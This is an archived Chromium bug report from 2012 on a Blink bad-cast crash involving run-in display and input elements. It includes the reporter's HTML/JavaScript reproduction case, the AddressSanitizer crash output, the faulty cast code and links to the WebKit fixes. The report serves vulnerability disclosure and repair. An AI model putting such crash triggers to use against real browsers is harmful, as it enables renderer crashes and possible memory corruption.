# Bad cast with run-ins and <input>

| Field | Value |
|-------|-------|
| **Issue ID** | [40060460](https://issues.chromium.org/issues/40060460) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2012-06-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

jumps to 0

==11019== ERROR: AddressSanitizer crashed on unknown address 0x000000000000 (pc 0x000000000000 sp 0x7fffffff87d8 bp 0x7fffffff87f0 T0)  

AddressSanitizer can not provide additional info. ABORTING

**VERSION**  

Chrome Version: stable + dev

Chromium 22.0.1189.0 (Developer Build 144460)  

OS Linux  

WebKit 537.1 (@121326)

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 { -webkit-appearance: inherit; }
.c0 { display: run-in; }
</style>
<script>
onload = function() {
el0=document.createElement('input')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
document.body.appendChild(document.createElement('div'))
document.body.offsetTop
el0.setAttribute('class', 'c0')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==11019== ERROR: AddressSanitizer crashed on unknown address 0x000000000000 (pc 0x000000000000 sp 0x7fffffff87d8 bp 0x7fffffff87f0 T0)  

AddressSanitizer can not provide additional info. ABORTING

## Attachments

- [zero.html](attachments/zero.html) (text/html; charset=us-ascii, 473 B)

## Timeline

### in...@chromium.org (2012-06-27)

This is a known bug. We do have a webkit tracking bug for this - https://bugs.webkit.org/show_bug.cgi?id=87300. We needed to have a laundry list of tags that shouldn't run-in.

### in...@chromium.org (2012-06-27)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-06-29)

Bulk Edit: m20 is shipped. Rolling open m19 bugs forward.

### in...@chromium.org (2012-08-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-01)

Kent-san, we are working to add a list of tags that shouldn't run-in in upstream bug. But since the spec is not clear and the bug is stalled.

This bug however is actually pointing the issue from http://trac.webkit.org/changeset/87067.
PassRefPtr<RenderStyle> TextControlInnerTextElement::customStyleForRenderer()
{
    RenderTextControl* parentRenderer = toRenderTextControl(shadowAncestorNode()->renderer());
    return parentRenderer->createInnerTextStyle(parentRenderer->style());
}

I think we should be verifying the type of renderer before doing the static cast. Can you please help to fix this or help with an owner. 

### in...@chromium.org (2012-08-01)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-08-02)

Please do read Mark's email titled "Code Yellow: Security Bug Backlog" on chrome-team mailing list.

### tk...@chromium.org (2012-08-02)

> I think we should be verifying the type of renderer before doing the static cast. Can you please help to fix this or help with an owner. 

I tried it, and I found input[type=text} with run-in was completely useless.  So I think blacklisting like <progress> and <select> is better.


### in...@chromium.org (2012-08-03)

Thanks a lot Kent. you are our Hero!

http://trac.webkit.org/changeset/124556

### sc...@gmail.com (2012-08-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-08-20)

@miaubiz: nice bad cast. $1000

### sc...@gmail.com (2012-08-24)

M21: http://trac.webkit.org/changeset/126632

### sc...@gmail.com (2012-08-29)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-12)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-14)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/134897?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/139217]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060460)*
